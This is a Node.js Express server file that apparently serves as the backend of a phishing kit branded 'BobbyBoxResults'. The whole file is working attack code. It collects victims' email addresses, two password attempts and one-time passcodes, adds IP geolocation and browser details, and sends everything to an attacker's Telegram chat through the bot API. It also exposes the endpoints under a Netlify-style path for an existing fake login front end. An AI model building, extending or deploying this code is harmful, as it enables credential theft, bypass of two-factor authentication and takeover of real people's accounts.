import express from 'express';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';
import { createRequire } from 'module';

const require = createRequire(import.meta.url);
const UAParser = require('ua-parser-js');

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// --- Configuration ---
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const FETCH_TIMEOUT = 15000;
const GEO_API_FIELDS = 'country,regionName,query';

// --- Middleware ---
app.use(express.json());

// Serve built React app static files
app.use(express.static(join(__dirname, 'dist')));

// --- Helper Functions (mirrored from netlify/functions/sendTelegram.js) ---

const createTimeoutSignal = (ms) => {
  const controller = new AbortController();
  setTimeout(() => controller.abort(), ms);
  return controller.signal;
};

const getClientIp = (req) => {
  const headers = req.headers;
  return (
    headers['x-forwarded-for'] ||
    headers['x-real-ip'] ||
    headers['cf-connecting-ip'] ||
    req.socket?.remoteAddress ||
    'Unknown'
  ).toString().split(',')[0].trim();
};

const getIpAndLocation = async (ip) => {
  const location = { country: 'Unknown', regionName: 'Unknown' };
  if (ip === 'Unknown' || ip === '127.0.0.1') return location;
  try {
    const geoResponse = await fetch(
      `http://ip-api.com/json/${ip}?fields=${GEO_API_FIELDS}`,
      { signal: createTimeoutSignal(3000) }
    );
    if (geoResponse.ok) {
      const geoJson = await geoResponse.json();
      location.country = geoJson.country || 'Unknown';
      location.regionName = geoJson.regionName || 'Unknown';
    }
  } catch (e) {
    console.error(`Geolocation lookup for IP ${ip} failed:`, e.message);
  }
  return location;
};

const getDeviceDetails = (userAgent) => {
  const uaParser = new UAParser(userAgent || '');
  const browser = uaParser.getBrowser();
  const os = uaParser.getOS();
  return {
    deviceType: /Mobile|Android|iPhone|iPad/i.test(userAgent || '') ? '📱 Mobile' : '💻 Desktop',
    browser: browser.name ? `${browser.name} ${browser.version || ''}`.trim() : 'Unknown Browser',
    os: os.name ? `${os.name} ${os.version || ''}`.trim() : 'Unknown OS',
  };
};

// --- Message Composers (mirrored from netlify/functions/sendTelegram.js) ---

const composeCredentialsMessage = (data) => {
  const {
    email, provider, firstAttemptPassword, secondAttemptPassword,
    clientIP, location, deviceDetails, timestamp, sessionId,
  } = data;

  const passwordSection = `🔑 First (invalid): \`${firstAttemptPassword}\`\n🔑 Second (valid): \`${secondAttemptPassword}\``;

  const formattedTimestamp = new Date(timestamp || Date.now()).toLocaleString('en-US', {
    year: 'numeric', month: 'short', day: 'numeric',
    hour: '2-digit', minute: '2-digit', second: '2-digit',
    timeZone: 'UTC', hour12: true,
  }) + ' UTC';

  return `
*🔐 BobbyBoxResults - Credentials 🔐*

*ACCOUNT DETAILS*
- 📧 Email: \`${email || 'Not captured'}\`
- 🏢 Provider: *${provider || 'Others'}*
- ${passwordSection}

*DEVICE & LOCATION*
- 📍 IP Address: \`${clientIP}\`
- 🌍 Location: *${location.regionName}, ${location.country}*
- 💻 OS: *${deviceDetails.os}*
- 🌐 Browser: *${deviceDetails.browser}*
- 🖥️ Device Type: *${deviceDetails.deviceType}*

*SESSION INFO*
- 🕒 Timestamp: *${formattedTimestamp}*
- 🆔 Session ID: \`${sessionId}\`
`;
};

const composeOtpMessage = (data) => {
  const { otp, session } = data;
  const { email, provider, clientIP, location, deviceDetails, sessionId } = session || {};

  const formattedTimestamp = new Date().toLocaleString('en-US', {
    year: 'numeric', month: 'short', day: 'numeric',
    hour: '2-digit', minute: '2-digit', second: '2-digit',
    timeZone: 'UTC', hour12: true,
  }) + ' UTC';

  return `
*🔑 BobbyBoxResults - OTP Code 🔑*

*VERIFICATION CODE*
- 🔢 OTP Code: \`${otp}\`

*ASSOCIATED SESSION*
- 📧 Email: \`${email || 'N/A'}\`
- 🏢 Provider: *${provider || 'N/A'}*
- 📍 IP Address: \`${clientIP || 'N/A'}\`
- 🆔 Session ID: \`${sessionId}\`

*SUBMITTED AT*
- 🕒 Timestamp: *${formattedTimestamp}*
`;
};

// --- sendTelegram handler (same logic as Netlify function) ---

const sendTelegramHandler = async (req, res) => {
  res.set({
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  });

  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('FATAL: Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID env vars.');
    return res.status(500).json({ success: false, message: 'Server misconfiguration.' });
  }

  try {
    const body = req.body;
    const { type, data } = body;
    let message;

    if (type === 'credentials') {
      const clientIP = getClientIp(req);
      const location = await getIpAndLocation(clientIP);
      const deviceDetails = getDeviceDetails(data.userAgent);
      const messageData = { ...data, clientIP, location, deviceDetails };
      message = composeCredentialsMessage(messageData);
    } else if (type === 'otp') {
      message = composeOtpMessage(data);
    } else {
      // Fallback for old format or unknown types
      console.warn('Request received with unknown or missing "type". Processing as credentials.');
      const clientIP = getClientIp(req);
      const location = await getIpAndLocation(clientIP);
      const deviceDetails = getDeviceDetails(body.userAgent);
      const sessionId = body.sessionId || Math.random().toString(36).substring(2, 15);
      message = composeCredentialsMessage({ ...body, clientIP, location, deviceDetails, sessionId });
    }

    const telegramResponse = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' }),
        signal: createTimeoutSignal(FETCH_TIMEOUT),
      }
    );

    if (!telegramResponse.ok) {
      const errorResult = await telegramResponse.json().catch(() => ({ description: 'Failed to parse Telegram error response.' }));
      console.error('Telegram API Error:', errorResult.description);
    }

    return res.json({ success: true, sessionId: data?.sessionId });
  } catch (error) {
    console.error('Function execution error:', error.message);
    return res.status(500).json({ error: 'An internal server error occurred.' });
  }
};

// CORS preflight for the Netlify-compatible endpoint path
app.options('/.netlify/functions/sendTelegram', (req, res) => {
  res.set({
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  }).sendStatus(200);
});

// Mount sendTelegram at the same path the frontend already calls
app.post('/.netlify/functions/sendTelegram', sendTelegramHandler);
// Also expose a clean /api alias for forward compatibility
app.post('/api/sendTelegram', sendTelegramHandler);

// SPA fallback — return index.html for every non-API GET request
app.get('*', (req, res) => {
  res.sendFile(join(__dirname, 'dist', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
});
